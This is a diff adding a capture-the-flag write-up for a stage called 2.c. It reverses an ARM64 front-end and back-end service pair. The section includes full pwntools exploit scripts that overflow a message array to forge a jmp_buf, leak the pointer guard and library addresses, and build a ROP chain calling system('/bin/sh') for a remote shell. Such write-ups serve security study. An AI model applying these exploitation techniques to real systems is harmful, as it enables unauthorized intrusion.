@@ -408,6 +408,461 @@ The description for the stage 2.c files ([`devices/deviceC`](chall/devices/devic
 
 We're given [`frontend_service.bin`](chall/devices/deviceC/frontend_service.bin), a Linux ARM64 binary, along with the corresponding [`ld.so`](chall/devices/deviceC/ld-linux-aarch64.so.1) and [`libc.so`](chall/devices/deviceC/remote_lib.so.6). We're also provided with a [proof of work solver](chall/devices/deviceC/pow_solver.py).
 
+To make interacting with the server faster, I rewrote the challenge solver to use multiprocessing ([`chalsolve.py`](files/stage2c/chalsolve.py)); it takes just a second or two to solve the remote PoW with this on my laptop.
+
+I used Ghidra to reverse `frontend_service.bin`. The service launches a server on port 1336, which we can connect to on device.quatre-qu.art:8080 after entering the password and solving the PoW. It connects to another server on 127.0.0.1:1337 (the "backend"), which I was able to simulate with simply `cat` (as `socat tcp-l:1337,reuseaddr,fork exec:cat`).
+
+`main` looks like this:
+
+```c
+int client_fd[2];
+int server_fd;
+
+client_fd[0] = -1;
+client_fd[1] = -1;
+server_fd = create_server(1336,0);
+do {
+  client_fd[1] = connect_compute("127.0.0.1",1337);
+} while (client_fd[1] == -1);
+client_fd[0] = server_accept_conn(server_fd);
+clear_msgs();
+memset(&exc_msg,0,0x148);
+exc_occurred = _setjmp((__jmp_buf_tag *)&jmpbuf);
+if (exc_occurred != 0) {
+  handle_exc(exc_msg,client_fd[0]);
+}
+clientloop(client_fd);
+comm_pkt.cmd = 0x133b;
+comm_write(client_fd[1]);
+closefd_msg(0,&server_fd);
+closefd_msg("Closing connection\n",client_fd);
+closefd_msg(0,client_fd + 1);
+```
+
+`clientloop` (0x1e10) presents an interactive menu, allowing the user to select "Encrypt", "Decrypt", "Sign", "Admin area" or "Quit". Here's a sample interaction:
+
+<pre>
+password: <b>fudmH/MGzgUM7Zx3k6xMuvThTXh+ULf1</b>
+Find the number n such that sha256(n + b'DNPKX') starts with 6 zeros
+number: <b>07669496</b>
+correct
+Welcome to your device which action do you want to do?
+E. Encrypt
+D. Decrypt
+S. Sign
+A. Go To Admin Area
+Q. Quit
+Option: <b>A</b>
+Welcome to the Admin area, what do you want to do ?
+R. Get running firmware
+U. Update firmware
+Option: <b>R</b>
+Enter admin password:
+<b>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</b>
+Invalid password
+Welcome to your device which action do you want to do?
+E. Encrypt
+D. Decrypt
+S. Sign
+A. Go To Admin Area
+Q. Quit
+Option: <b>E</b>
+A. Add data
+V. View data
+E. Encrypt data
+B. Back to main menu
+Option: <b>A</b>
+Data size: <b>1</b>
+Data id: <b>0</b>
+Data in hex?(y/n)
+Option: <b>n</b>
+Data: <b>x</b>
+crc (hex): <b>8cdc1683</b>
+Data successfully added
+A. Add data
+V. View data
+E. Encrypt data
+B. Back to main menu
+Option: <b>E</b>
+Message 0 encrypted: c2c291d84cec22a50d53ef2d8e2fb90c
+Welcome to your device which action do you want to do?
+E. Encrypt
+D. Decrypt
+S. Sign
+A. Go To Admin Area
+Q. Quit
+Option: <b>E</b>
+A. Add data
+V. View data
+E. Encrypt data
+B. Back to main menu
+Option: <b>A</b>
+Data size: <b>1</b>
+Data id: <b>0</b>
+Data in hex?(y/n)
+Option: <b>n</b>
+Data: <b>x</b>
+crc (hex): <b>11111111</b>
+Exception raised: Invalid crc
+Welcome to your device which action do you want to do?
+E. Encrypt
+D. Decrypt
+S. Sign
+A. Go To Admin Area
+Q. Quit
+Option: <b>E</b>
+A. Add data
+V. View data
+E. Encrypt data
+B. Back to main menu
+Option: <b>V</b>
+Data in hex?(y/n)
+Option: <b>y</b>
+Message 0: 78
+A. Add data
+V. View data
+E. Encrypt data
+B. Back to main menu
+Option: <b>B</b>
+Welcome to your device which action do you want to do?
+E. Encrypt
+D. Decrypt
+S. Sign
+A. Go To Admin Area
+Q. Quit
+Option: <b>Q</b>
+Closing connection
+</pre>
+
+Everything after `correct` is from the service itself. The admin area isn't much use without the admin password. The other options, Encrypt, Decrypt and Sign, all run through the same sub-menu function (0x1cb8), which allows the user to add data, view data, or (encrypt/decrypt/sign) depending on which top-level option was chosen.
+
+If an exception occurs in any of the interactions, the front-end sets a pointer to the exception message and calls `longjmp` to go back to `main` before `clientloop`, allowing the interaction to be restarted.
+
+Communication with the back-end uses a custom protocol consisting of fixed-length packets of the following format:
+
+```c
+struct comm_pkt {
+    uint resp;
+    uint cmd;
+    struct msg {
+        byte mode;
+        uint size_mode0;
+        uint id;
+        byte data[256];
+        uint crc;
+        uint size_mode1;
+    } payload;
+};
+```
+
+The front-end sends a packet with `cmd` set, and the back-end responds with a packet with `resp` set. `resp = 1` usually means success, while `resp = 0` means failure. `struct msg` is basically a wrapper for an arbitrary crc-checked blob of data up to 256 bytes in length. Notably, there are *two* size fields in `struct msg`, and which one is used depends on the value of the `mode` byte.
+
+The front-end has a fixed-length array of ten `msg` structures at 0x15020, which are filled in with the "Add data" subcommand. The "Add data" subcommand calls the function at 0x1008, which looks like this:
+
+```c
+if (can_add != 1) {
+  exc_msg = "Cannot add more data\n";
+                  // WARNING: Subroutine does not return
+  longjmp((__jmp_buf_tag *)&jmpbuf,1);
+}
+uVar1 = (ulong)num_msgs;
+num_msgs = num_msgs + 1;
+read_msg(param_1,msgs + uVar1,mode);
+if (num_msgs == 10) {
+  can_add = 0;
+}
+write(param_1,"Data successfully added\n",0x18);
+```
+
+The first part of [my exploit](files/stage2c/exploit.py) contains code to interact with the service; it looks like this:
+
+```python
+from pwn import *
+
+context.update(arch="aarch64")
+if args.DEBUG:
+    context.update(log_level="debug")
+
+if args.LOCAL:
+    s = remote("focal", 1336); local = True
+else:
+    s = remote("device.quatre-qu.art", 8080); local = False
+
+if not local:
+    log.info("Logging in...")
+    s.recvuntil(b"password:")
+    s.sendline(b"fudmH/MGzgUM7Zx3k6xMuvThTXh+ULf1")
+    s.recvuntil(b"b'")
+    suffix = s.recvuntil(b"'", drop=True)
+    log.info("Solving challenge (suffix=%s)...", suffix)
+    prefix = subprocess.check_output([sys.executable, "chalsolve.py", suffix.decode()]).strip()
+    s.sendline(prefix)
+    log.info("Ready!")
+
+menucount = 0
+def menu(opt):
+    global menucount
+    menucount += 1
+    s.send(opt.encode() + b"\n")
+
+def menusync():
+    global menucount
+    while menucount:
+        s.recvuntil(b"Option:")
+        menucount -= 1
+
+def sendint(n):
+    s.sendline(str(n).encode())
+
+def crc(msg):
+    import zlib
+    return "{:08x}".format(zlib.crc32(msg) & 0xffffffff)
+
+def bad_msg(content):
+    menu("E")
+    menu("A")
+    sendint(len(content))
+    sendint(1)
+    menu("n")
+    s.sendline(content)
+    s.sendline(b"00000000")
+```
+
+### Exploiting the Front-End
+
+The main bug in the front-end is that the "add data" command sets the `can_add` global flag *after* calling `read_msg`. `read_msg` asks the user to input a message, and there are several ways to make it throw an exception: inputting a bad size (outside of 1-256), a bad packet ID (outside of 0-9), a bad answer to "Data in hex?" (outside of `y`/`n`) or inputting a bad CRC.
+
+Thus, we can overflow the `msgs` array as follows: add 9 messages, then add a 10th message with an incorrect CRC or size. This will throw an exception from `read_msg`, preventing the `can_add` flag from being set to 0; subsequent messages will be written out of bounds.
+
+The memory layout of the BSS looks like this:
+
+```
+0x15020  msg  msgs[10]
+0x15ae8  uint num_msgs
+0x15aec  byte unused[0x134]
+0x15c20  char *exc_msg
+0x15c28  uint exc_occurred
+0x15c30  jmp_buf jmpbuf
+```
+
+So, by overflowing the `msgs` array, we can manipulate `jmpbuf`, thereby changing where `longjmp` goes when an exception occurs.
+
+On this version of `libc`, `jmpbuf` contains two pointers of interest: the saved LR (x30) register, which tells `longjmp` where to return to, and the saved SP (stack pointer). Both are guarded by XORing against a randomly-chosen value (`__pointer_chk_guard`). We can create an uninitialized message by specifying a size of 256, then providing an invalid response to the "Data in hex?" question and triggering an exception. Then, we can "View" the message to leak memory contents. Using this, we can leak the `exc_msg` pointer to obtain the binary's base address (PIE is enabled), and the contents of `jmpbuf` to leak an obfuscated program address, a libc address which happens to be captured in `jmpbuf`, and a stack address:
+
+```python
+# fill msgs
+for i in range(10):
+    bad_msg(b"a")
+
+# insert extra msg, throw exception on msg size
+menu("E")
+menu("A")
+sendint(999)
+
+# insert one more to overlap jmpbuf, throw exception on hex choice
+menu("E")
+menu("A")
+sendint(256)
+sendint(9)
+menu("?")
+
+# leak jmpbuf
+menu("E")
+menu("V")
+menu("y")
+menusync()
+s.recvuntil(b"Message 9: ")
+leak = bytes.fromhex(s.recvline().decode())
+
+exe_base = u64(leak[0x18:0x20]) - 0x4060
+log.info("exe base: %x", exe_base)
+ptr_guard = u64(leak[0x80:0x88]) ^ (exe_base + 0x1f8c)
+log.info("ptr guard: %x", ptr_guard)
+stack_addr = u64(leak[0x90:0x98]) ^ ptr_guard
+log.info("stack addr: %x", stack_addr)
+libc_base = u64(leak[0x38:0x40]) - 0x151000
+log.info("libc base: %x", libc_base)
+
+# clear messages via password check
+menu("B")
+menu("A")
+menu("R")
+s.sendline(b"not-the-passwordnot-the-password")
+menusync()
+```
+
+This gives us everything we need to fake our own `jmpbuf`. We can point the stack into one of the `msg` structures in order to get ROP, and freely use gadgets from libc or the binary. The first thing we do is to bypass the password check in the admin area to get the running firmware:
+
+```python
+new_jmpbuf = bytearray(leak)
+new_jmpbuf[0x80:0x88] = p64(ptr_guard ^ (exe_base + 0x2da8)) # in retr_firmware
+new_jmpbuf[0x90:0x98] = p64(ptr_guard ^ (exe_base + 0x159e0))
+new_stack = flat([
+    0, 0, 0, exe_base + 0x159e0 + 0x30, 0, 0, # handle_exc
+    p32(5) + p32(4),
+])
+new_stack = new_stack.ljust(256)
+
+# fill msgs
+for i in range(9):
+    bad_msg(b"a")
+
+bad_msg(new_stack)
+
+# insert extra msg, throw exception on msg size
+menu("E")
+menu("A")
+sendint(999)
+
+# insert one more to overlap jmpbuf, throw exception on crc to longjmp
+bad_msg(new_jmpbuf)
+
+s.recvuntil(b"Retrieving firmware ...\n")
+s.interactive()
+```
+
+Here, we're jumping to 0x2da8, which is in the function that retrieves the firmware after the password check (at 0x2d9c). The specific address jumps to a point after the function has built a stack frame and stored the argument (x0 - pointer to `client_fd`) on the stack. So, our fake `jmpbuf` will contain a pointer to a fake stack frame that contains a pointer to a faked `client_fd` structure, allowing this function to work correctly.
+
+When we run this first exploit ([`exploit.py`](files/stage2c/exploit.py)), it successfully reads the firmware and hexdumps it to us, resulting in the file [`firmware.bin`](files/stage2c/firmware.bin).
+
+We can also use ROP to call `system("/bin/sh")` to obtain an interactive shell ([`exploit2.py`](files/stage2c/exploit2.py)):
+
+```python
+client_fd = 5
+new_stackaddr = exe_base + 0x15590
+new_jmpbuf = bytearray(leak)
+new_jmpbuf[0x80:0x88] = p64(ptr_guard ^ (exe_base + 0x249c)) # in readall
+new_jmpbuf[0x90:0x98] = p64(ptr_guard ^ new_stackaddr)
+rop = flat([
+    0, exe_base + 0x23b4, # => write, for sanity check
+        new_stackaddr + 0x30, p32(0xaaaaaaaa), p32(client_fd), 0, 0,
+    0, libc_base + 0x000dda08, # ldp x0, x1, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret; 
+        exe_base + 0x1502c, p32(16), p32(client_fd),
+    0, libc_base + 0xbc8e0, # dup2
+        0, 0, 5, 0,
+    0, libc_base + 0x000dda08, # ldp x0, x1, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret; 
+        0, 0,
+    0, libc_base + 0xbc8e0, # dup2
+        0, 0, 5, 1,
+    0, libc_base + 0x000dda08, # ldp x0, x1, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret; 
+        0, 0,
+    0, libc_base + 0xbc8e0, # dup2
+        0, 0, 5, 2,
+    0, libc_base + 0x000dda08, # ldp x0, x1, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret; 
+        0, 0,
+    0, libc_base + 0x47734, # system
+        0, 0, exe_base + 0x159e0, 0,
+])
+rop1 = bytearray(rop[:0x30])
+rop2 = rop[0x30:]
+rop1[0x18:0x1c] = p32(len(rop2))
+log.info("sending %d-byte rop", len(rop2))
+
+# fill msgs
+bad_msg(b"Hello from ROP!\n")
+for i in range(4):
+    bad_msg(b"a")
+bad_msg(rop1)
+for i in range(3):
+    bad_msg(b"a")
+bad_msg(b"/bin/sh\0")
+
+# insert extra msg, throw exception on msg size
+menu("E")
+menu("A")
+sendint(999)
+
+# insert one more to overlap jmpbuf, throw exception on crc to longjmp
+bad_msg(new_jmpbuf)
+
+s.send(rop2)
+s.recvuntil(b"Hello from ROP!\n")
+
+s.interactive()
+```
+
+We find that there are two users, `backendUser` and `frontendUser`, and that we can read `/home/backendUser/update-unit` (which is basically identical to our dumped `firmware.bin`), but not `/home/backendUser/box-B`, which is the binary that is actually running according to `ps -ef`. There's nothing else particularly interesting to see.
+
+### Reversing the Backend
+
+The backend binary, according to `ps -ef`, is `box-B`, but we do cannot access that binary. Instead, we have [`firmware.bin`](files/stage2c/firmware.bin). Again, it's an ARM64 binary, so I opened it in Ghidra. However, the binary is corrupted: every section aside from `.text` (and `.shstrtab`) is missing! `.rodata`, `.dynamic`, `.dynsym`, `.dynstr` and so on are all gone, and the data is not even in the binary. The program headers are similarly corrupt: only the program header for the text section is intact, while the other program headers all have an offset and size of zero. Ghidra still decompiles the program fine, but references to libc functions are all unresolved, read-only data like strings are missing, and relocations are all unresolved. This makes reversing a lot more difficult.
+
+Luckily, some of the functionality of the front-end was included in the backend, but not actually referenced in the binary: for example, the function at 0x2a90 in the backend corresponds to the `read_msg` function in the front-end (0x33c4), and we can use this correspondence to resolve many libc functions.
+
+The general structure of the backend is similar to the front-end. `main` looks like this:
+
+```c
+uVar1 = create_server(1337);
+uVar2 = server_accept_conn(uVar1);
+random_nonces(paes_nonces);
+memset(exc,0,0x148);
+iVar3 = setjmp(&exc->jmpbuf);
+exc->exc_occurred = iVar3;
+clear();
+if (exc->exc_occurred != 0) {
+  exc_report(exc->exc_message,uVar2);
+}
+mainloop(uVar2);
+close(uVar2);
+close(uVar1);
+```
+
+where `exc` is a global variable of the following structure:
+
+```c
+struct exc_info {
+    char *exc_message;
+    int exc_occurred;
+    jmp_buf jmpbuf;
+} *exc;
+```
+
+Again, it creates a server, listens for a connection, and uses `setjmp` for exception handling. However, instead of providing a textual menu, `mainloop` instead reads a single `comm_pkt`, and then conditions on the `cmd` field. Several commands are defined:
+
+- 0x1337: Add a message. Just like the front-end, there is an array of ten `msg` structures in the BSS.
+- 0x1338: Encrypt all messages.
+- 0x1339: Decrypt all messages.
+- 0x133a: Sign all messages. (Not actually implemented: returns the hardcoded message `Some breadcrumbs fell in the secure element signature module and we are currently dusting it` for every message)
+- 0x133b: Exit.
+- 0x133c: Check the password and return 1 in `resp` if it is correct, or 0 if it is not.
+- 0x133d: Retrieve the firmware.
+- 0x133e: Check the password and return the AES key if it is correct, or the input string if it is not.
+
+In "add", the number of stored messages is checked directly, unlike the backend which uses a separate `can_add` variable, so the same vulnerability does not apply. Furthermore, the only place that triggers an exception (`longjmp`) is in `mainloop`, which will trigger an exception when the `resp` is 0. This can happen when receiving an invalid command or when an individual command fails (e.g. wrong password).
+
+### The Backend Vulnerability
+
+As I found out after finishing the competition, the **intended** solution was that the 0x133e check was using `snprintf` to "copy" the input string to the response packet in the wrong-password case, *using the user input as the format string*, so you could use `%s` and `%x` etc. to leak stuff off the stack, including the AES key. Unfortunately, I **completely missed** this while reversing `firmware.bin` due to the lack of symbols. I had this tagged as `strncpy` as you can see from my decompilation:
+
+```c
+rpkt->resp = 0;
+local_30._0_8_ = 0;
+local_30._8_8_ = 0;
+local_30._16_8_ = 0;
+local_30._24_8_ = 0;
+local_30[32] = 0;
+strncpy?(local_30,0x21,(pcVar2->payload).data);
+rpkt->cmd = 0x1337;
+(pcVar2->payload).size_mode0 = 0x32;
+memcpy(pmVar1,CHAR_ARRAY_00104788,0x32);
+pkt_clear();
+reply_msg(param_1);
+FUN_00100e90(1);
+(pcVar2->payload).size_mode0 = 0x20;
+memcpy(pmVar1,local_30,0x20);
+reply_msg(param_1);
+uVar5 = 0;
+```
+
+Note that the real `strncpy` has the arguments in a different order (`dst`, `src`, `n`), which should have been a hint, but I did not catch this during my solution attempt.
+
+Instead, I found a different bug. The add function (at 0x1340) checks that the size is valid before adding a message, but only for the size field corresponding to the `mode` of the message. So, it checks `size_mode0` if `mode = 0`, and `size_mode1` if `mode = 1`. However, the encrypt (0x1718) and decrypt (0x1830) functions will directly use `size_mode0` and `size_mode1` respectively without checking the mode of the message. Thus, by sending a message with an out-of-bounds `size_mode0` and `mode = 1`, we can cause an overflow in `encrypt`, and vice-versa for `decrypt`.
+
+Unfortunately, exploiting this bug is far more complicated than exploiting a format-string vulnerability.
+
+### Exploiting AES-CBC to Flip Bits
+
+Encryption and decryption are done using AES-256 in CBC mode, using 10 random nonces (one per `msg`, derived from `/dev/urandom`). C's private key is used as the AES key. Both encryption and decryption follow the same structure: the function loops over each message (up to `msg_count`) and encrypts or decrypts the message body up to `size_mode0` (encrypt) or `size_mode1` (decrypt). Neither encryption nor decryption use any padding. After processing a message, the result is sent back in a packet. After processing all messages, the message array is cleared by setting `msg_count = 0` and zeroing out all ten `msg`s.
 
 ## Stage 2.d
 
